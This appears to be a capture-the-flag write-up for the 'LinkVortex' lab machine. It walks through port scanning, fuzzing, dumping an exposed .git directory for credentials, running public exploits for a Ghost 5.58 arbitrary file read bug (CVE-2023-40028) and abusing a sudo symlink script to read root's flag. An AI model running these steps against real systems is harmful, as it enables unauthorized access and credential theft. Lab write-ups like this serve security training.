---
layout: post
title: "LinkVortex"
date: 2025-04-20 
categories: ctf
---

# Attack Path

First enumerate the open ports:

```bash
rustscan -a 10.129.231.194

sudo nmap -sC -sV -p 22,80 -oA nmap/linkvortex 10.129.231.194

result:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 03:57 GMT
Nmap scan report for 10.129.231.194
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://linkvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.85 seconds

```

We see the domain name, let’s add that to /etc/hosts.

Let’s enumerate for subdomains:

```bash
ffuf -u http://linkvortex.htb -H "Host: FUZZ.linkvortex.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fw 14

dev
```

Also upon visiting the site, webappalyzer tells us that the site uses Ghost 5.58 as its CMS. Searching for this version of exploit, it resulted in a authenticated file read exploit where we need valid credentials. A Google search tells us the url for login is at /ghost and trying the default admin:admin does not work.

Let’s also enumerate for subdirectories:

```bash
gobuster dir -u http://dev.linkvortex.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt

/.git                 (Status: 301) [Size: 239] [--> http://dev.linkvortex.htb/.git/]                                                                     
/.git/HEAD            (Status: 200) [Size: 41]                                                                                                            
/.git/config          (Status: 200) [Size: 201]                                                                                                           
/.git/logs/           (Status: 200) [Size: 868]                                                                                                           
/.htpasswd            (Status: 403) [Size: 199]                                                                                                           
/.hta                 (Status: 403) [Size: 199]                                                                                                           
/.htaccess            (Status: 403) [Size: 199]                                                                                                           
/.git/index           (Status: 200) [Size: 707577]                                                                                                        
/cgi-bin/             (Status: 403) [Size: 199]                                                                                                           
/index.html           (Status: 200) [Size: 2538]                                                                                                          
/server-status        (Status: 403) [Size: 199]
```

The reason you need to use tools like **git-dumper** or **dumper.py** to dump the entire `.git` directory instead of just viewing it from the web is due to the way the `.git` directory is structured and how it works. Here’s why:

---

### **1. `.git` is a Version Control Repository**

The `.git` directory is not a single file you can view in a browser; it is a **repository structure** used by Git to store:

- Version history
- Metadata
- Objects (commits, blobs, trees)
- Configuration

The contents are highly fragmented and not easily interpretable by simply browsing the web.

---

### **2. Critical Information is Stored in Non-Human-Readable Formats**

The `.git` directory contains many binary files and structured data:

- The commit history and file contents are stored as **objects** (compressed blobs).
- You can’t directly view meaningful files like source code or configurations just by accessing `.git` via the web.

For example:

- **`objects/`**: Contains hashed objects (files, commits, etc.).
- **`refs/`**: Contains branch references, like `refs/heads/master`.
- **`HEAD`**: Points to the current branch.

Without specialized tools, reconstructing the repository manually is nearly impossible.

Now let’s use something like git-dumper

```bash
python3 -m venv myenv
source myenv/bin/activate
pip3 install git-dumper

#Now let's dump .git dir
git-dumper http://dev.linkvortex.htb .git
```

Now let’s try and find credentials from the whole .git directory:

```bash
grep -rEi "password\s*=\s*'[^']+'" .

result:
./ghost/core/test/regression/api/content/pages.test.js:        const hashedPassword = '$2a$10$FxFlCsNBgXw42cBj0l1GFu39jffibqTqyAGBz7uCLwetYAdBYJEe6';
./ghost/core/test/regression/api/content/pages.test.js:        const hashedPassword = '$2a$10$FxFlCsNBgXw42cBj0l1GFu39jffibqTqyAGBz7uCLwetYAdBYJEe6';
./ghost/core/test/regression/api/content/posts.test.js:        const hashedPassword = '$2a$10$FxFlCsNBgXw42cBj0l1GFu39jffibqTqyAGBz7uCLwetYAdBYJEe6';
./ghost/core/test/regression/api/content/posts.test.js:        const hashedPassword = '$2a$10$FxFlCsNBgXw42cBj0l1GFu39jffibqTqyAGBz7uCLwetYAdBYJEe6';
./ghost/core/test/regression/api/content/authors.test.js:        const hashedPassword = '$2a$10$FxFlCsNBgXw42cBj0l1GFu39jffibqTqyAGBz7uCLwetYAdBYJEe6';
./ghost/core/test/regression/api/content/authors.test.js:        const hashedPassword = '$2a$10$FxFlCsNBgXw42cBj0l1GFu39jffibqTqyAGBz7uCLwetYAdBYJEe6';
./ghost/core/test/regression/api/admin/authentication.test.js:            const password = 'OctopiFociPilfer45';
./ghost/core/test/regression/api/admin/authentication.test.js:            const password = 'thisissupersafe';
```

Next let’s go the config file in question and find if there are any associated usernames. However the usernames don’t seem to work. Let’s try and guess a username e.g. admin@linkvortex.htb

Now searching we have credentials, searching for ghost 5.58 exploit lead us to https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028. Let’s clone the repo and try and execute the exploit:

```bash
./cve-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb/ghost/#/dashboard
```

Does  not work. Let’s try and search for more exploit. This is all just guess work, if one doesn’t work try and find another with another programming language, on Google: Ghost 5.58 exploit arbitrary file read python. https://github.com/monke443/CVE-2023-40028-Ghost-Arbitrary-File-Read

```bash
python3 exploit.py --user admin@linkvortex.htb --password OctopiFociPilfer45 --url http://linkvortex.htb/
```

Now we have arbitrary read.

Back in the .git dir, let’s reread the Docker file. 

```bash
# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

```

This line seems interesting as it might contain credentials. Let’s try and read that with our POC:

```bash
result:
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"

```

Now let’s try and ssh in with the acquired credentials:

```bash
ssh bob@10.129.179.105 #fibber-talented-worth"
```

We are logged in as user bob. Let’s check our sudo privileges:

```bash
sudo -l

result:
User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Putting that script in chatgpt and get it to suggest a way to bypass the png sanitization results us in symlink. Let’s try that:

```bash
ln -s /proc/self/root/root/flag.txt /tmp/malicious.png
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/malicious.png
```

Does not work. Based on this principle, let’s try and create two links:

```bash
#we also have to set the CHECK_CONTENT=true

export CHECK_CONTENT=true
ln -sf /root/root.txt flag.png
ln -sf /home/bob/flag.png flag2.png    #Need the full path /home/bob
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh flag2.png
```